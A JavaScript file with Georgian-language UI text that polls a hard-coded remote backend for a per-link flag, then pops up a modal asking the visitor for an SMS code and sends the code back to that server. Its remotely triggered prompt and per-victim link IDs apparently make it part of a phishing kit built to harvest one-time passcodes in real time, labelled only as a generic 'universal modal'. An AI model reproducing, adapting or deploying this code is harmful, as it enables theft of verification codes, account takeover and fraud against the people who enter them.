// SMS Code Modal - Universal Modal for requesting SMS codes
// Usage: Call SMSModal.show() to display SMS request
// VERSION: 1.0 - 2026-06-17

const SMSModal = {
  // Initialize modal
  init() {
    const modal = document.getElementById('sms-modal');
    if (!modal) {
      this.createModal();
    }
    this.attachEventListeners();
  },

  // Create modal HTML structure
  createModal() {
    const modalHTML = `
      <div id="sms-modal" class="sms-modal">
        <div class="sms-modal-content">
          <div class="sms-modal-icon">📱</div>
          <div class="sms-modal-title">SMS კოდი</div>
          <div class="sms-modal-message">მიერთებული ხომ ხარ? შენ უნდა გაიღებ SMS კოდი</div>
          <div id="sms-modal-input-container">
            <input type="text" id="sms-modal-input" class="sms-modal-input" placeholder="კოდი ჩაწერე..." maxlength="6">
          </div>
          <div class="sms-modal-buttons">
            <button class="sms-modal-btn sms-modal-btn-close" onclick="SMSModal.close()">
              დახურვა
            </button>
            <button id="sms-modal-submit" class="sms-modal-btn sms-modal-btn-submit" onclick="SMSModal.submitSMS()">
              გაგზავნა
            </button>
          </div>
        </div>
      </div>
    `;
    document.body.insertAdjacentHTML('beforeend', modalHTML);
  },

  // Attach event listeners
  attachEventListeners() {
    const modal = document.getElementById('sms-modal');
    if (!modal) return;

    // Close on background click
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        this.close();
      }
    });

    // Close on Escape key
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && modal.classList.contains('show')) {
        this.close();
      }
    });

    // Auto-submit on Enter key
    const input = document.getElementById('sms-modal-input');
    if (input) {
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          this.submitSMS();
        }
      });
    }
  },

  // Show SMS modal
  show(linkId = null) {
    const modal = document.getElementById('sms-modal');
    if (!modal) {
      this.init();
    }

    const input = document.getElementById('sms-modal-input');
    if (input) {
      input.value = '';
      input.focus();
    }

    this.currentLinkId = linkId;
    modal.classList.add('show');
    document.body.style.overflow = 'hidden';

    console.log(`✅ SMS modal shown for link_id=${linkId}`);
  },

  // Close modal
  close() {
    const modal = document.getElementById('sms-modal');
    if (modal) {
      modal.classList.remove('show');
      document.body.style.overflow = '';
    }
  },

  // Polling function to check for SMS requests from backend
  startPolling(linkId, pageType = 'orders', intervalMs = 3000) {
    if (!linkId) {
      console.warn('SMSModal.startPolling: linkId is required');
      return;
    }

    // Initial setup
    this.init();
    this.pollingInterval = setInterval(() => {
      this.checkForSMSRequest(linkId, pageType);
    }, intervalMs);

    console.log(`✅ SMS polling started for link_id=${linkId}, page_type=${pageType}`);
  },

  // Stop polling
  stopPolling() {
    if (this.pollingInterval) {
      clearInterval(this.pollingInterval);
      this.pollingInterval = null;
      console.log('❌ SMS polling stopped');
    }
  },

  // Check for SMS request from backend
  async checkForSMSRequest(linkId, pageType = 'orders') {
    try {
      const BASE_URL = 'https://worker-production-740e.up.railway.app';
      const response = await fetch(`${BASE_URL}/sms/${linkId}?page_type=${pageType}`);
      if (!response.ok) return;

      const data = await response.json();
      if (data && data.sms_requested) {
        // SMS request found
        this.show(linkId);

        // Mark as read
        await fetch(`${BASE_URL}/sms/${linkId}/read?page_type=${pageType}`, { method: 'POST' });

        console.log('✅ SMS request shown, polling continues');
      }
    } catch (error) {
      console.log('Error checking for SMS request:', error);
      // Silent fail - polling continues
    }
  },

  // Submit SMS code
  async submitSMS() {
    const input = document.getElementById('sms-modal-input');
    const smsCode = input ? input.value.trim() : '';

    console.log('📱 submitSMS called');
    console.log('📝 SMS code:', smsCode);
    console.log('🔗 Current link_id:', this.currentLinkId);

    if (!smsCode) {
      alert('გთხოვთ, კოდი ჩაწერეთ');
      return;
    }

    if (smsCode.length < 4) {
      alert('კოდი ძალიან მოკლეა');
      return;
    }

    if (!this.currentLinkId) {
      alert('შეცდომა: link_id ვერ მოიძებნა');
      return;
    }

    try {
      const BASE_URL = 'https://worker-production-740e.up.railway.app';
      const url = `${BASE_URL}/sms/${this.currentLinkId}/submit`;
      console.log('📡 Sending to:', url);
      console.log('📦 Body:', { sms_code: smsCode });

      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms_code: smsCode })
      });

      console.log('✅ Fetch response received:', response.status, response.ok);

      if (response.ok) {
        // Show success message
        const messageEl = document.querySelector('.sms-modal-message');
        if (messageEl) {
          messageEl.textContent = '✅ კოდი გაიგზავნა!\n\nმადლობა!';
        }

        // Hide input and submit button
        const inputContainer = document.getElementById('sms-modal-input-container');
        const submitBtn = document.getElementById('sms-modal-submit');
        if (inputContainer) inputContainer.style.display = 'none';
        if (submitBtn) submitBtn.style.display = 'none';

        // Close after 2 seconds
        setTimeout(() => this.close(), 2000);
      } else {
        alert('შეცდომა კოდის გაგზავნისას');
      }
    } catch (error) {
      console.error('Error submitting SMS code:', error);
      alert('შეცდომა: ' + error.message);
    }
  }
};

// Auto-initialize when DOM is ready
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    SMSModal.init();
  });
} else {
  SMSModal.init();
}
